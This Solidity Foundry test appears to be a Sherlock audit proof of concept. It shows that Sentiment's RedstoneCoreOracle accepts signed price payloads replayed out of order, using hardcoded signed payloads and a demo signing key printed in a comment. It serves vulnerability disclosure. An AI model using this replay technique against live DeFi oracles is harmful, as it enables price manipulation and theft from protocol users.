// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import { Math } from "@openzeppelin/contracts/utils/math/Math.sol";
import "@redstone-oracles-monorepo/packages/evm-connector/contracts/data-services/MainDemoConsumerBase.sol";

import {RedstoneCoreOracle} from "../src/oracle/RedstoneOracle.sol";

/// @notice A mock oracle which allows us to use Sentiment's
/// @notice `RedstoneCoreOracle` in conjunction with the
/// @notice mock payload signatures.
contract SherlockRedstoneCoreOracle is RedstoneCoreOracle {

    constructor(address asset, bytes32 assetFeedId, bytes32 ethFeedId)
        RedstoneCoreOracle(asset, assetFeedId, ethFeedId) {}

    function getUniqueSignersThreshold() public view virtual override returns (uint8) {
        return 1;
    }

    function getAuthorisedSignerIndex(
        address signerAddress
    ) public view virtual override returns (uint8) {
        /// @notice Using the address related to the private key in
        /// @notice Redstone Finance's `minimal-foundry-repo`: https://github.com/redstone-finance/minimal-foundry-repo/blob/c493d4c1e15fa1b08ebaae85f454b843ba5999c4/getRedstonePayload.js#L24C24-L24C90

        /// @dev const redstoneWallet = new ethers.Wallet('0x548e7c2fae09cc353ffe54ed40609d88a99fab24acfc81bfbf5cd9c11741643d');
        //  @dev console.log('Redstone:', redstoneWallet.address);
        /// @dev Redstone: 0x71d00abE308806A3bF66cE05CF205186B0059503
        if (signerAddress == 0x71d00abE308806A3bF66cE05CF205186B0059503) return 0;

        revert SignerNotAuthorised(signerAddress);
    }
}

contract SherlockTest is Test {

    using Math for uint256;

    /// @notice Demonstrate that the `RedstoneCoreOracle` is
    /// @notice vulnerable to manipulation.
    function testSherlockRedstoneTimestampManipulation() external {
        /// @notice You must use an Arbitrum mainnet compatible
        /// @notice archive node rpc.
        vm.createSelectFork(vm.envString("ARB_RPC_URL"));

        /// @notice This conditional controls whether to generate and sign
        /// @notice Redstone payloads locally, in case judges would like to
        /// @notice verify the payload content for themselves. This happens
        /// @notice if you specify `GENERATE_REDSTONE_PAYLOADS=true`
        /// @notice in your `.env`.
        /// @notice By default, the test suite will fall back to the included payloads. 
        bool generatePayloads = vm.envExists("GENERATE_REDSTONE_PAYLOADS");
        if (generatePayloads) generatePayloads = vm.envBool("GENERATE_REDSTONE_PAYLOADS");

        /// @notice Warp to a recent Arbitrum block. We have this fixed
        /// @notice in place to ease the generation of mock observations
        /// @notice which satisfy the validity period.
        vm.warp(243528007) /* Warp To Block */;

        bytes memory beforePayload = (
            generatePayloads
                ? new SherlockMockRedstonePayload().getRedstonePayload("ETH:3000:8,USDC:1:8", "243528007000")
                : bytes(hex"455448000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000045d964b80055534443000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005f5e1000038b3667d5800000020000002f3d4b060d793f6ba027fcbb94ab6ba26f17a1527446c42e7bc32e14926aa2f1167d1d38049f766c56d48170b9acdea4315b2132a6e3bba0137b87bf2305df1371c0001000000000002ed57011e0000")
        );

        bytes memory afterPayload = (
            generatePayloads
                ? new SherlockMockRedstonePayload().getRedstonePayload("ETH:2989:8,USDC:1:8", "243528066000" /* 59s in the future */)
                : bytes(hex"45544800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004597d40d0055534443000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005f5e1000038b36763d00000002000000290709f13dc06738bbdb82175adbd9b0532cad9db59367b9e63ffac979230fdf222a0043cbcfe6244c30207df1355c416c6165b5d0b1d2a54eab53a807de8a5ed1b0001000000000002ed57011e0000")
        );

        SherlockRedstoneCoreOracle sherlockRedstoneCoreOracle = new SherlockRedstoneCoreOracle({
            asset: 0xaf88d065e77c8cC2239327C5EDb3A432268e5831,
            assetFeedId: bytes32("USDC"),
            ethFeedId: bytes32("ETH")
        });

        bool success;

        console.log("Apply Before Payload:");
        (success,) = address(sherlockRedstoneCoreOracle).call(
            abi.encodePacked(abi.encodeWithSignature("updatePrice()"), beforePayload)
        );
        require(success);

        console.log("ETH:", sherlockRedstoneCoreOracle.ethUsdPrice());
        console.log("USDC:", sherlockRedstoneCoreOracle.assetUsdPrice());

        console.log("Apply After Payload:");
        (success,) = address(sherlockRedstoneCoreOracle).call(
            abi.encodePacked(abi.encodeWithSignature("updatePrice()"), afterPayload)
        );
        require(success);

        console.log("ETH:", sherlockRedstoneCoreOracle.ethUsdPrice());
        console.log("USDC:", sherlockRedstoneCoreOracle.assetUsdPrice());

        console.log("Apply Before Payload Again:");
        (success,) = address(sherlockRedstoneCoreOracle).call(
            abi.encodePacked(abi.encodeWithSignature("updatePrice()"), beforePayload)
        );
        require(success);

        console.log("ETH:", sherlockRedstoneCoreOracle.ethUsdPrice());
        console.log("USDC:", sherlockRedstoneCoreOracle.assetUsdPrice());
    }

}

/// @notice A contract which we can use to pull results from
/// @notice `getRedstonePayload.js`, a utility which enables
/// @notice us to mock redstone payloads for local development.
/// @notice This is only used when `GENERATE_REDSTONE_PAYLOADS=true`.
/// @notice Credit: https://github.com/redstone-finance/minimal-foundry-repo/blob/main/getRedstonePayload.js
contract SherlockMockRedstonePayload is Test {
    function getRedstonePayload(
        // dataFeedId:value:decimals
        string memory priceFeed,
        // i.e. 1000
        string memory timestampMilliseconds
    ) public returns (bytes memory) {
        string[] memory args = new string[](4);
        args[0] = "node";
        args[1] = "../minimal-foundry-repo/getRedstonePayload.js";
        args[2] = priceFeed;
        args[3] = timestampMilliseconds;

        return vm.ffi(args);
    }
}